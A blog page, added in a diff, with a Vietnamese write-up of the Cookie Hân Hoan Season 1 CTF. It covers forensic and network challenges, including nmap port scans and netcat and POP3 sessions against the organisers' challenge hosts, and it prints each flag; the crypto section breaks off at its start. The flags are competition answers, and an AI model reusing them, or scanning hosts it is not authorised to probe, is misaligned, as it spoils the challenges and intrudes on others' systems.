@@ -1,0 +1,1537 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Writeups Cookie Hân Hoan Season 1 | th3_5had0w</title>
+<meta name="generator" content="Jekyll v4.2.1" />
+<meta property="og:title" content="Writeups Cookie Hân Hoan Season 1" />
+<meta name="author" content="th3_5had0w" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="FORENSIC" />
+<meta property="og:description" content="FORENSIC" />
+<link rel="canonical" href="https://th3-5had0w.github.io/2021/11/05/write-up-cookie-han-hoan-1.html" />
+<meta property="og:url" content="https://th3-5had0w.github.io/2021/11/05/write-up-cookie-han-hoan-1.html" />
+<meta property="og:site_name" content="th3_5had0w" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-11-05T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeups Cookie Hân Hoan Season 1" />
+<script type="application/ld+json">
+{"description":"FORENSIC","@type":"BlogPosting","url":"https://th3-5had0w.github.io/2021/11/05/write-up-cookie-han-hoan-1.html","headline":"Writeups Cookie Hân Hoan Season 1","dateModified":"2021-11-05T00:00:00+00:00","datePublished":"2021-11-05T00:00:00+00:00","author":{"@type":"Person","name":"th3_5had0w"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://th3-5had0w.github.io/2021/11/05/write-up-cookie-han-hoan-1.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://th3-5had0w.github.io/feed.xml" title="th3_5had0w" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">th3_5had0w<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/th3_5had0w_w"><i class="fab fa-twitter-square"></i></a><a class="color-purple-hover" href="https://github.com/th3-5had0w"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="
+            https://gravatar.com/avatar/4241e14141109999e63e51ba2f6eac59?s=256
+        " class="author-avatar" alt="Avatar" />
+    
+Hi, i'm th3_5had0w, nice to meet you, welcome to my darkness kingdom, where i often solve math problems and play ctf!
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Writeups Cookie Hân Hoan Season 1</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/network/">network</a>
+      
+      <a class="tag" href="/tag/forensic/">forensic</a>
+      
+      <a class="tag" href="/tag/crypto/">crypto</a>
+      
+      <a class="tag" href="/tag/cookiehanhoan/">cookiehanhoan</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 05 Nov 2021</div>
+  
+  <h1 id="forensic">FORENSIC</h1>
+
+<h2 id="exseller">Exseller</h2>
+<blockquote>
+  <p>Để không bị Mèo nhòm ngó tệp tài liệu quan trọng. Gà nhanh tay đặt mật khẩu, nhưng lại vô tình quên mất. Làm thế nào bây giờ T_T</p>
+</blockquote>
+
+<p>Chương trình cho ta 1 file excel <a href="">bruteme.xlxs</a>, thử thách này chỉ là 1 mẹo tin học văn phòng bình thường, ta chỉ đổi file extension từ xlxs thành zip là có ngay một file có thể giải nén được, giải nén ra rồi thì mình đi tham quan vòng vòng ở trong mấy thư mục một chút, và mình để ý ngay file nằm ở đường dẫn <code class="language-plaintext highlighter-rouge">bruteme\xl\sharedStrings.xml</code>, mở ra thì ta thấy luôn flag nằm trong đó, thử thách này không khó nhưng cũng thú vị đối với các bạn newbie.</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{Micro$oft_Heck3r_Man}</code></p>
+
+<h2 id="streamer">Streamer</h2>
+<blockquote>
+  <p>Anh nghệ sĩ nhiều đam mê đang vớt rác bên tàu. Ta lang thang với bản vẽ đời ta tự tô màu.</p>
+
+  <p>Ô! Vớt được cái gì thú zị này!</p>
+</blockquote>
+
+<p>Chương trình cho ta 1 file pcapng, vậy thì lại wireshark thần chưởng thôi :Đ</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/streamer1.png" alt="" /></p>
+
+<ul>
+  <li>Hmm, có vẻ rối rắm, thôi vô export object xem có lụm được gì không?</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/streamer2.png" alt="" /></p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/streamer3.png" alt="" /></p>
+
+<p>Hmmm, 1 file rar à, xem thử coi có gì nào</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/streamer4.png" alt="" /></p>
+
+<p>Ơ bắt nhập password à 🙄, mò xem mấy file kia có gì</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/streamer5.png" alt="" /></p>
+
+<p>Ọ, password nè, nhập vô thử phát.</p>
+
+<p>Eiii, có flag nè =))</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{TCP_streamin_go_skrrrrrrrt}</code></p>
+
+<h2 id="volatility">Volatility</h2>
+<blockquote>
+  <p>The true forenSeek</p>
+
+  <p>Giữ nguyên hiện trường là việc cần thiết trong quá trình điều tra số. Một trong những file lưu trữ hình ảnh của RAM trong quá trình làm đề thi được leak ra cho các chiến binh. Cho mình thấy các cậu tìm được gì nào :)</p>
+</blockquote>
+
+<p>Theo bản năng, khi gặp một chall forensic mình sẽ dùng <code class="language-plaintext highlighter-rouge">strings</code> hay <code class="language-plaintext highlighter-rouge">grep</code> để tìm flag trước:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-i</span> flag<span class="o">{</span> <span class="nt">-a</span> <span class="nt">-C</span> 1 DESKTOP-K5GNI06-20211028-104628.raw
+</code></pre></div></div>
+
+<p>Và nó đã xuất hiện, chẳng cần phải dùng tới <code class="language-plaintext highlighter-rouge">volatility</code>, khiển trách BTC =)))</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>L$�|\$Chu$�$�$�$�$Ǆ$&lt;�lt$�,u�|$$u$�$u$�P$P�e$$K|$uL$�&lt;|\$$+C|�j$D$0jPD$D$�P$�P���t$ tHW�ўD$uL$�|\$D$Chtu
+L$�:|\$C|L$P+D$,$+D$0$D$@PP�u$PPL$X�ut$ $��v$�u�v$��D$D+$D$0D$H+$D$4L$,L$0Qx�,�nL$0���$Ǆ$&lt;�lt
+                                                                                             $�)u|$u	L$�9||$\$$G@tu�u�uD$tD$Gw		https://pastebin.com/1vcbAg4WFlag{7ef31e58bd4086e294b4d700c721f35f} - Pastebin.com/-vx,H�H�;�?Hs@HHqDL���qDL6LHvPHFH;��_H[qDL���OqDH\$0Hl$8Ht$@Dw LwH|$HH�A^��������H�H�DuHL$(&amp;
+</code></pre></div></div>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{7ef31e58bd4086e294b4d700c721f35f}</code></p>
+
+<h2 id="from-the-above">From The Above</h2>
+<blockquote>
+  <p>Gà và Mèo Yang Hồ đã cùng nhau thoát khỏi trọng lực, lẩn trốn loài người tại một hành tinh đày đất đá, và một khí quyển mỏng.</p>
+
+  <p>Vượt qua chặng đường 472 triệu km trong 7 tháng, đây là bức ảnh đầu tiên họ gửi về trái đất.</p>
+
+  <p>Bạn có giải mã được những tín hiệu này không?</p>
+</blockquote>
+
+<p>Đề bài cho ta một file audio với những âm thanh bing bong bíp bíp, nhìn cả title mang chủ đề vũ trụ và nghe ấm thanh thì mình đã kiểu: “Oxjt axjt, lại SSTV à boi, chuẩn bị ez game câu này.”</p>
+
+<p>Nhưng không, mình dùng QSSTV mãi vẫn không ra, chỉnh tần số input, output, đổi clock RX, TX các kiểu,… gần cả 1 buổi chiều và thứ mình nhận lại không phải là flag mà là chứng bệnh đau nửa đầu kinh niên 🙂</p>
+
+<p>Mình đã quyết định “<a href="https://www.youtube.com/watch?v=qGRU3sRbaYw">anh xin giơ tay rút lui thôi, trách ai bây giờ đây?</a>” nhưng vào ngày hôm sau mình quyết định thử lại phát cuối, sử dụng các keyword như sstv, signal, satellite, decode, how to play ctf if im stupid, etc… và cuối cùng trong giây phút “<a href="https://www.youtube.com/watch?v=mKxzJzp6oes">ngàn lần anh yếu đuối, ngàn lần để nước mắt rơi</a>” mình thấy một cái tool tên là <code class="language-plaintext highlighter-rouge">noaa-apt</code>, mình cũng chả có hi vọng gì nữa nhưng thôi cứ thử, mình kiếm docs của phần mềm này để đọc cách sử dụng và đoán xem.</p>
+
+<p>Sau khi cài, bỏ file wav vào decode rồi ấn process thì tấm hình này hiện ra.</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/from_the_above.png" alt="" /></p>
+
+<p>Giải ra được bài này không khác gì chó ngáp táp ruồi, khox.</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{h3ll0_fr0m_th3_0th3r_Sky}</code></p>
+
+<h1 id="network">NETWORK</h1>
+
+<h2 id="where-is-my-house">Where is my house?</h2>
+<blockquote>
+  <p>DNS cũng chứa các thông tin khác, nó gọi là các bản ghi (Record). Bạn thử tìm xem domain này còn có những bản ghi nào chứa những điều kì quặc không?
+letspentest.org</p>
+</blockquote>
+
+<p>Chỉ cần nhập tên miền đề bài cho lên trang <a href="https://dnsdumpster.com/">dnsdumpster</a> là ta thấy ngay flag luôn ở phần TXT record.</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{DNS_A_AAAA_TXT_CNAME}</code></p>
+
+<h2 id="scan-me-if-you-can">Scan me if you can?</h2>
+<blockquote>
+  <p>Nếu coi mỗi máy chủ là một ngôi nhà, trước khi xâm nhập vào bên trong, các Hacker phải thực hiện việc thăm dò. Họ xem xét đâu là điểm yếu nhất của ngôi nhà, chỗ nào là điểm mù camera? Chủ nhà hoặc bảo vệ sẽ phản ứng thế nào khi có xuất hiện các dấu hiệu bất thường?</p>
+
+  <p>Trong quá trình tìm kiếm lỗ hổng, Hazy thường xem xét ngôi nhà này có bao nhiêu cánh cửa đang mở (Port). Hãy sử dụng công cụ thân quen để “ném đá” vào tất cả các cánh cửa của ngôi nhà.</p>
+
+  <p>Biết rằng, cửa sổ được đánh số từ 8100 tới 9100</p>
+
+  <p>Dựa vào sự phản hồi bạn sẽ biết được những điều thú vị!</p>
+
+  <p>network-insecure.letspentest.org</p>
+</blockquote>
+
+<p>Sử dụng nmap để scan và ta thấy có 2 cổng mở là 9003 và 9004:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nmap -Pn -p 8100-9100 network-insecure.letspentest.org
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 19:47 PDT
+Nmap scan report for network-insecure.letspentest.org (18.140.65.99)
+Host is up (0.040s latency).
+rDNS record for 18.140.65.99: ec2-18-140-65-99.ap-southeast-1.compute.amazonaws.com
+Not shown: 999 filtered ports
+PORT     STATE SERVICE
+9003/tcp open  unknown
+9004/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 64.66 seconds
+</code></pre></div></div>
+
+<p>Scan tiếp từng cổng:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nmap -A -Pn -p 9003 network-insecure.letspentest.org
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 19:54 PDT
+Nmap scan report for network-insecure.letspentest.org (18.140.65.99)
+Host is up (0.042s latency).
+rDNS record for 18.140.65.99: ec2-18-140-65-99.ap-southeast-1.compute.amazonaws.com
+
+PORT     STATE SERVICE VERSION
+9003/tcp open  http    nginx 1.20.0
+|_http-server-header: Flag{Every-Header-Have-It-Own-Meaning}Date: Thu, 04 Nov 2021 02:54:41 GMT
+|_http-title: Welcome to nginx!
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
+pwn@ubuntu:~/Desktop$ nmap -A -Pn -p 9004 network-insecure.letspentest.org
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 19:55 PDT
+Nmap scan report for network-insecure.letspentest.org (18.140.65.99)
+Host is up (0.040s latency).
+rDNS record for 18.140.65.99: ec2-18-140-65-99.ap-southeast-1.compute.amazonaws.com
+
+PORT     STATE SERVICE  VERSION
+9004/tcp open  ssl/http nginx
+|_http-server-header: Flag{Every-Header-Have-It-Own-Meaning}Date: Thu, 04 Nov 2021 02:55:43 GMT
+|_http-title: Welcome to nginx!
+| ssl-cert: Subject: commonName=https://discord.gg/cookiehanhoan/organizationName=Flag{This-Is-A-Trusted-One}/stateOrProvinceName=Chicken-Little/countryName=VN
+| Not valid before: 2021-10-28T14:15:27
+|_Not valid after:  2022-10-28T14:15:27
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
+</code></pre></div></div>
+
+<p>Sau khi scan xong thì vô tình ta có cả 2 flag, flag của câu này và flag của câu Secure HTTP luôn mà không cần làm gì, mình nghĩ có lẽ BTC đã setup lỗi gì đó hoặc cố tình đưa ra 2 flag để lừa người chơi?</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{Every-Header-Have-It-Own-Meaning}</code></p>
+
+<h2 id="very-good-shipper">Very Good Shipper</h2>
+<blockquote>
+  <p>Hãy tham gia đấu trường Cookie phiên bản nhanh như chớp. Gà phải chọn ra đáp án đúng trong thời gian nhanh nhất.</p>
+
+  <p>Giao thức TCP sẽ giúp các câu trả lời của Gà luôn được đảm bảo gửi đến máy chủ của Cookie Arena mà không bị rơi rớt một từ nào.</p>
+
+  <p>Tuy nhiên, Gà đã quên cổng kết nối vào máy chủ. Chỉ nhớ mang máng là nó giống với thử thách “Scan me if you can”</p>
+
+  <p>network.letspentest.org</p>
+</blockquote>
+
+<p>Hmm, đề bài nói là cổng kết nói giống với thử thách “Scan me if you can”, vậy ta sẽ tiến hành scan luôn 2 port 9003 và 9004.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nmap -A -Pn -p 9003 network.letspentest.org
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 19:59 PDT
+Nmap scan report for network.letspentest.org (18.139.222.220)
+Host is up (0.038s latency).
+rDNS record for 18.139.222.220: ec2-18-139-222-220.ap-southeast-1.compute.amazonaws.com
+
+PORT     STATE SERVICE VERSION
+9003/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     Cookie Arena Season 1.
+|     Cookie H
+|     Hoan c
+|     HACKER ???
+|   JavaRMI: 
+|     Cookie Arena Season 1.
+|     trao gi
+|     (write-up) cho BTC kh
+|     A.Kh
+|     HACKER ???
+|   NULL: 
+|     Cookie Arena Season 1.
+|     Cookie H
+|_    Hoan c
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9003-TCP:V=7.80%I=7%D=11/3%Time=61834CA0%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,14B,"\nCh\xc3\xa0o\x20m\xe1\xbb\xabng\x20b\xe1\xba\xa1n\x20\xc4\x91\
+SF:xe1\xba\xbfn\x20v\xe1\xbb\x9bi\x20c\xc3\xa1nh\x20c\xe1\xbb\xada\x20th\x
+SF:e1\xbb\xad\x20th\xc3\xa1ch\x20c\xe1\xbb\xa7a\x20Cookie\x20Arena\x20Seas
+SF:on\x201\.\n\x20\xc4\x90\xe1\xbb\x83\x20v\xc6\xb0\xe1\xbb\xa3t\x20qua\x2
+SF:0th\xe1\xbb\xad\x20th\xc3\xa1ch\x20n\xc3\xa0y,\x20h\xc3\xa3y\x20tr\xe1\
+SF:xba\xa3\x20l\xe1\xbb\x9di\x20\xc4\x91\xc3\xbang\x20c\xc3\xa1c\x20c\xc3\
+SF:xa2u\x20h\xe1\xbb\x8fi\x20d\xc6\xb0\xe1\xbb\x9bi\x20\xc4\x91\xc3\xa2y\.
+SF:\n\xe1\xbb\x9e\x20m\xe1\xbb\x97i\x20c\xc3\xa2u\x20h\xe1\xbb\x8fi\x20b\x
+SF:e1\xba\xa1n\x20s\xe1\xba\xbd\x20c\xc3\xb3\x2010s\x20\xc4\x91\xe1\xbb\x8
+SF:3\x20nh\xe1\xba\xadp\x20c\xc3\xa2u\x20tr\xe1\xba\xa3\x20l\xe1\xbb\x9di\
+SF:x20A,\x20B,\x20C,\x20D\.\n\nCookie\x20H\xc3\xa2n\x20Hoan\x20c\xc3\xb3\x
+SF:20bao\x20nhi\xc3\xaau\x20nh\xc3\xa2n\x20v\xe1\xba\xadt\x20ch\xc3\xadnh\
+SF:?\nA\.3\nB\.4\nC\.2\nD\.1\n")%r(GenericLines,16D,"\nCh\xc3\xa0o\x20m\xe
+SF:1\xbb\xabng\x20b\xe1\xba\xa1n\x20\xc4\x91\xe1\xba\xbfn\x20v\xe1\xbb\x9b
+SF:i\x20c\xc3\xa1nh\x20c\xe1\xbb\xada\x20th\xe1\xbb\xad\x20th\xc3\xa1ch\x2
+SF:0c\xe1\xbb\xa7a\x20Cookie\x20Arena\x20Season\x201\.\n\x20\xc4\x90\xe1\x
+SF:bb\x83\x20v\xc6\xb0\xe1\xbb\xa3t\x20qua\x20th\xe1\xbb\xad\x20th\xc3\xa1
+SF:ch\x20n\xc3\xa0y,\x20h\xc3\xa3y\x20tr\xe1\xba\xa3\x20l\xe1\xbb\x9di\x20
+SF:\xc4\x91\xc3\xbang\x20c\xc3\xa1c\x20c\xc3\xa2u\x20h\xe1\xbb\x8fi\x20d\x
+SF:c6\xb0\xe1\xbb\x9bi\x20\xc4\x91\xc3\xa2y\.\n\xe1\xbb\x9e\x20m\xe1\xbb\x
+SF:97i\x20c\xc3\xa2u\x20h\xe1\xbb\x8fi\x20b\xe1\xba\xa1n\x20s\xe1\xba\xbd\
+SF:x20c\xc3\xb3\x2010s\x20\xc4\x91\xe1\xbb\x83\x20nh\xe1\xba\xadp\x20c\xc3
+SF:\xa2u\x20tr\xe1\xba\xa3\x20l\xe1\xbb\x9di\x20A,\x20B,\x20C,\x20D\.\n\nC
+SF:ookie\x20H\xc3\xa2n\x20Hoan\x20c\xc3\xb3\x20bao\x20nhi\xc3\xaau\x20nh\x
+SF:c3\xa2n\x20v\xe1\xba\xadt\x20ch\xc3\xadnh\?\nA\.3\nB\.4\nC\.2\nD\.1\n\n
+SF:\(\x20\xe2\x80\xa2_\xe2\x80\xa2\)&gt;\xe2\x8c\x90\xe2\x96\xa0-\xe2\x96\xa0
+SF:\x20HACKER\x20\?\?\?\n")%r(JavaRMI,1CD,"\nCh\xc3\xa0o\x20m\xe1\xbb\xabn
+SF:g\x20b\xe1\xba\xa1n\x20\xc4\x91\xe1\xba\xbfn\x20v\xe1\xbb\x9bi\x20c\xc3
+SF:\xa1nh\x20c\xe1\xbb\xada\x20th\xe1\xbb\xad\x20th\xc3\xa1ch\x20c\xe1\xbb
+SF:\xa7a\x20Cookie\x20Arena\x20Season\x201\.\n\x20\xc4\x90\xe1\xbb\x83\x20
+SF:v\xc6\xb0\xe1\xbb\xa3t\x20qua\x20th\xe1\xbb\xad\x20th\xc3\xa1ch\x20n\xc
+SF:3\xa0y,\x20h\xc3\xa3y\x20tr\xe1\xba\xa3\x20l\xe1\xbb\x9di\x20\xc4\x91\x
+SF:c3\xbang\x20c\xc3\xa1c\x20c\xc3\xa2u\x20h\xe1\xbb\x8fi\x20d\xc6\xb0\xe1
+SF:\xbb\x9bi\x20\xc4\x91\xc3\xa2y\.\n\xe1\xbb\x9e\x20m\xe1\xbb\x97i\x20c\x
+SF:c3\xa2u\x20h\xe1\xbb\x8fi\x20b\xe1\xba\xa1n\x20s\xe1\xba\xbd\x20c\xc3\x
+SF:b3\x2010s\x20\xc4\x91\xe1\xbb\x83\x20nh\xe1\xba\xadp\x20c\xc3\xa2u\x20t
+SF:r\xe1\xba\xa3\x20l\xe1\xbb\x9di\x20A,\x20B,\x20C,\x20D\.\n\nNh\xe1\xbb\
+SF:xafng\x20ng\xc6\xb0\xe1\xbb\x9di\x20\xc4\x91\xc6\xb0\xe1\xbb\xa3c\x20ba
+SF:n\x20t\xe1\xbb\x95\x20ch\xe1\xbb\xa9c\x20l\xe1\xbb\xb1a\x20ch\xe1\xbb\x
+SF:8dn\x20\xc4\x91\xe1\xbb\x83\x20trao\x20gi\xe1\xba\xa3i,\x20c\xc3\xb3\x2
+SF:0ph\xe1\xba\xa3i\x20g\xe1\xbb\xadi\x20c\xc3\xa1ch\x20gi\xe1\xba\xa3i\x2
+SF:0c\xc3\xa1c\x20th\xe1\xbb\xad\x20th\xc3\xa1ch\x20\(write-up\)\x20cho\x2
+SF:0BTC\x20kh\xc3\xb4ng\?\nA\.Kh\xc3\xb4ng\nB\.C\xc3\xb3\n\n\(\x20\xe2\x80
+SF:\xa2_\xe2\x80\xa2\)&gt;\xe2\x8c\x90\xe2\x96\xa0-\xe2\x96\xa0\x20HACKER\x20
+SF:\?\?\?\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
+pwn@ubuntu:~/Desktop$ nmap -A -Pn -p 9004 network.letspentest.org
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 20:00 PDT
+Nmap scan report for network.letspentest.org (18.139.222.220)
+Host is up.
+rDNS record for 18.139.222.220: ec2-18-139-222-220.ap-southeast-1.compute.amazonaws.com
+
+PORT     STATE    SERVICE VERSION
+9004/tcp filtered unknown
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2.32 seconds
+</code></pre></div></div>
+
+<p>Nhưng scan thì ta thấy ở cổng 9003 có trả về request là một mớ gì đó hỗn độn, trông giống url encode.</p>
+
+<p>Hmmmmm, nhìn có vẻ khả nghi, oce, mình sẽ dùng chương trình nc để thử kết nối vào:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nc network.letspentest.org 9003
+
+Chào mừng bạn đến với cánh cửa thử thách của Cookie Arena Season 1.
+ Để vượt qua thử thách này, hãy trả lời đúng các câu hỏi dưới đây.
+Ở mỗi câu hỏi bạn sẽ có 10s để nhập câu trả lời A, B, C, D.
+
+Có bao nhiêu chủ đề trong Cookie Arena Season 1?
+A.2
+B.4
+C.6
+D.3
+</code></pre></div></div>
+
+<p>Ok, không nghi ngờ gì nữa, đây chính là chương trình interactive thông qua netcat, ta có 2 cách làm ở đây, 1 là code chương trình socket để tự gửi và nhận data, nhưng mà đây toàn là những câu hỏi trivia, nên thôi, mình làm tay vậy :Đ</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nc network.letspentest.org 9003
+
+Chào mừng bạn đến với cánh cửa thử thách của Cookie Arena Season 1.
+ Để vượt qua thử thách này, hãy trả lời đúng các câu hỏi dưới đây.
+Ở mỗi câu hỏi bạn sẽ có 10s để nhập câu trả lời A, B, C, D.
+
+Cookie Hân Hoan là fanpage chia sẻ về?
+A.Chuyện cười 
+B.Bánh bánh quy
+C.Bài học cuộc sống 
+D.Bảo mật và an toàn thông tin
+D
+
+░ ∗ ◕ ں ◕ ∗ ░ Chuẩn Rồi ░ ∗ ◕ ں ◕ ∗ ░
+
+Ngoài 3 giải chính (nhất, nhì, ba), thì Cookie Hân Hoan có bao nhiêu giải thưởng phụ?
+A.8
+B.10
+C.5
+D.2
+B
+
+░ ∗ ◕ ں ◕ ∗ ░ Chuẩn Rồi ░ ∗ ◕ ں ◕ ∗ ░
+
+Những người được ban tổ chức lựa chọn để trao giải, có phải gửi cách giải các thử thách (write-up) cho BTC không?
+A.Không
+B.Có
+B
+
+░ ∗ ◕ ں ◕ ∗ ░ Chuẩn Rồi ░ ∗ ◕ ں ◕ ∗ ░
+
+Bạn đang kết nối tới cánh cửa này thông qua giao thức mạng nào?
+A.FTP
+B.UDP
+C.TCP
+D.ICMP
+C
+
+░ ∗ ◕ ں ◕ ∗ ░ Chuẩn Rồi ░ ∗ ◕ ں ◕ ∗ ░
+
+Có bao nhiêu chủ đề trong Cookie Arena Season 1?
+A.6
+B.4
+C.2
+D.3
+A
+
+░ ∗ ◕ ں ◕ ∗ ░ Chuẩn Rồi ░ ∗ ◕ ں ◕ ∗ ░
+
+Cookie Hân Hoan có bao nhiêu nhân vật chính?
+A.3
+B.4
+C.2
+D.1
+B
+
+░ ∗ ◕ ں ◕ ∗ ░ Chuẩn Rồi ░ ∗ ◕ ں ◕ ∗ ░
+
+
+Flag{t00-ez-4-y0u}
+</code></pre></div></div>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{t00-ez-4-y0u}</code></p>
+
+<h2 id="post-office-man">Post Office Man</h2>
+<blockquote>
+  <p>Anh bưu tá này là một người mà Gà rất tin tưởng. Gà ủy quyền cho anh ấy lên bưu điện, nói chuyện với anh kiểm thư để lấy thư về.</p>
+
+  <p>Nếu giấy ủy quyền hợp lệ, anh kiểm thư sẽ giữ lại bản gốc rồi photocopy ra một bản khác để anh bưu tá đem về cho Gà. Để nhỡ trong trường hợp Gà có tức quá xé thư đi thì vẫn có thể lên đây lấy lại.</p>
+
+  <p>Đố bạn anh bưu tá sử dụng giao thức email nào để nói chuyện với anh kiểm thư?</p>
+
+  <p>network.letspentest.org 9002</p>
+</blockquote>
+
+<p>Ta dùng lệnh netcat để connect vào cổng 9002 của tên miền network.letspentest.org</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn@ubuntu:~/Desktop$ nc network.letspentest.org 9002
++OK popper file-based pop3 server ready
+
+Please using USER to login first
+Các Bạn hãy sử dụng câu lênh USER để login vào hệ thống
+(Cứ nhập linh tinh zô 乁| ･ 〰 ･ |ㄏ)
+USER th3_5had0w
+
++OK user accepted
+
+Please using PASS to login first
+Các Bạn hãy sử dụng câu lênh PASS để login vào hệ thống
+(Cú nhập linh tinh zô 乁| ･ 〰 ･ |ㄏ)
+PASS pwn
+
++OK pass accepted
+LIST
+
++OK 10 messages (9400 octets)
+1 940
+2 940
+3 940
+4 940
+5 940
+6 940
+7 940
+8 940
+9 940
+10 940
+</code></pre></div></div>
+
+<p>Sau khi nhìn thấy từ khóa USER và PASS thì mình đã ngờ ngợ đó là command của giao thức POP3, thế là thử thêm lệnh LIST để xác nhận, và nó đúng là giao thức POP3. Ở đây có 10 mục thì ta chỉ cần dùng command RETR với từng mục là sẽ ra nội dung của mục đó, và flag nằm ở trong mục thứ 8.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RETR 8
+
++OK 940 octets
+Received: from [208.10.167.165] by sweetwater.netease.net
+(SMTPD32-5.05) id AC28801E8; Thu, 19 Aug 1999 20:15:20 -0500
+Message-Id: &lt;199908192015750.SM00960@&gt;
+X-RCPT-TO: dusty@demo.netease.net
+Date: Thu, 19 Aug 1999 20:15:55 -0500
+X-UIDL: 230371285
+Status: U
+From: &lt;dusty@netease.net&gt;
+
+
+Subject: test
+Dear Anonymous,
+
+Thank you for using ThrowAway Mail to fight spam, your temporary disposable email is :
+
+prugochihu@wemel.site
+
+************************| Flag{1-Ha\/3-1o0o-UnS33n-3Ma1L} |********************
+
+
+Use it to communicate with any website you want to. You have 48 hours to use this mailbox, if you do not visit your mail inbox within 48 hours, it wil be deleted , once visited your mail box extends to another 48 hours.
+
+For using this service you MUST enable cookie and javascript, cookie is just to record your session id and language preference, your Privacy is covered under our Privacy and Cookie policy .
+
+ThrowAwayMail Team
+</code></pre></div></div>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{1-Ha\/3-1o0o-UnS33n-3Ma1L}</code></p>
+
+<h2 id="secure-http">Secure HTTP</h2>
+<blockquote>
+  <p>HTTP và HTTPS đều là hai giao thức giúp trình duyệt của bạn truy cập, tương tác với các trang Web. Tuy nhiên khi sử dụng giao thức HTTP để truy cập Web ở một quán cà phê hay trong cùng một khu trọ thì tất cả các nội dung trao đổi nhạy cảm, cũng như mật khẩu của bạn trên Web đều có thể nghe lén.</p>
+
+  <p>Còn HTTPS (chữ S có nghĩa là Secure - Bảo mật) sinh ra để mã hóa dữ liệu trong quá trình trao đổi giữa trình duyệt và máy chủ bằng một chiếc Chứng chỉ (Certificate)</p>
+
+  <p>network-insecure.letspentest.org 9004</p>
+</blockquote>
+
+<p>Câu này đã có được flag trong câu scan me if you can.</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{This-Is-A-Trusted-One}</code></p>
+
+<h1 id="cryptography">CRYPTOGRAPHY</h1>
+
+<h2 id="xor">XOR</h2>
+<p>Chương trình cho ta 1 <a href="">file chứa quy trình mã hóa</a> và 1 <a href="">file chứa đoạn cipher</a> đã bị mã hóa.</p>
+
